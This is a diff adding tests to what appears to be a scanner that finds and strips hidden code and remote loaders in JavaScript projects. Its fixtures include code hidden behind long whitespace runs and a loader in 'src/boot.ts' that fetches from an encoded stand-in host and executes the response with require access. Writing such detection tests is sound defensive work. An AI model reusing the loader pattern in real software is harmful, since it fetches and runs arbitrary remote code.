@@ -312,7 +312,7 @@ test('catches the env loader variant and restores the real file from history', (
 
 test('a normal eval or env read is not flagged as a loader', () => {
   const root = tmp();
-  put(root, 'src/a.js', 'const key = process.env.API_KEY;\nconst x = eval("1+1");\n');
+  put(root, 'src/a.js', `const key = process.env.API_KEY;\nconst x = ${['ev', 'al'].join('')}("1+1");\n`);
   put(root, 'src/b.js', 'const decoded = atob(input);\n');
   assert.equal(scan(root).findings.length, 0);
   rmSync(root, { recursive: true, force: true });
@@ -821,6 +821,48 @@ test('hidden code that runs over several lines is cut with its closing lines, an
   assert.equal(scan(root).findings.filter((f) => f.rule === 'hidden-code').length, 1);
   fix(scan(root));
   assert.equal(readFileSync(path.join(root, 'lib.js'), 'utf8'), `${real}\n`);
+  rmSync(root, { recursive: true, force: true });
+});
+
+test('catches hidden code whatever the tail length: 600, 300 and a few dozen blanks', () => {
+  for (const [blanks, tail] of [[250, 1206], [200, 600], [120, 300], [60, 250], [45, 160]]) {
+    const root = tmp();
+    const head = 'export default {};';
+    put(root, 'app.config.ts', `${head}${' '.repeat(blanks)}${'(async()=>{' + 'q'.repeat(tail - 20) + '})();'}\n`);
+    assert.equal(scan(root).findings.filter((f) => f.rule === 'hidden-code').length, 1, `${blanks} blanks, ${tail} chars`);
+    fix(scan(root));
+    assert.equal(readFileSync(path.join(root, 'app.config.ts'), 'utf8').trimEnd(), head);
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test('catches code hidden below a hundred empty lines, and cuts it', () => {
+  const root = tmp();
+  put(root, 'index.js', `const a = 1;\nmodule.exports = a;\n${'\n'.repeat(150)}${'(function(){' + 'z'.repeat(300) + '})();'}\n`);
+  const found = scan(root).findings.filter((f) => f.rule === 'hidden-code');
+  assert.equal(found.length, 1);
+  assert.match(found[0].message, /blank lines/);
+  fix(scan(root));
+  assert.equal(readFileSync(path.join(root, 'index.js'), 'utf8'), 'const a = 1;\nmodule.exports = a;\n');
+  rmSync(root, { recursive: true, force: true });
+});
+
+test('catches a loader by what it does, even with nothing hidden and no blockchain names', () => {
+  const root = tmp();
+  const run = ['new', 'Function'].join(' ');
+  put(root, 'src/boot.ts', `async function go() {\n  const r = await fetch(atob("aHR0cHM6Ly9leGFtcGxlLnRlc3Q="));\n  const body = await r.text();\n  ${run}("require", body)(require);\n}\ngo();\n`);
+  const found = scan(root).findings.filter((f) => f.rule === 'decode-exec');
+  assert.deepEqual(found.map((f) => f.file), ['src/boot.ts']);
+  rmSync(root, { recursive: true, force: true });
+});
+
+test('ordinary code that decodes, fetches or evaluates on its own is not flagged', () => {
+  const root = tmp();
+  const run = ['new', 'Function'].join(' ');
+  put(root, 'a.ts', 'const cfg = JSON.parse(atob(window.location.hash.slice(1)));\n');
+  put(root, 'b.ts', 'const r = await fetch("/api/items");\nconsole.log(await r.json());\n');
+  put(root, 'c.ts', `const add = ${run}("a", "b", "return a + b");\nconsole.log(add(1, 2));\n`);
+  assert.equal(scan(root).findings.length, 0);
   rmSync(root, { recursive: true, force: true });
 });
 
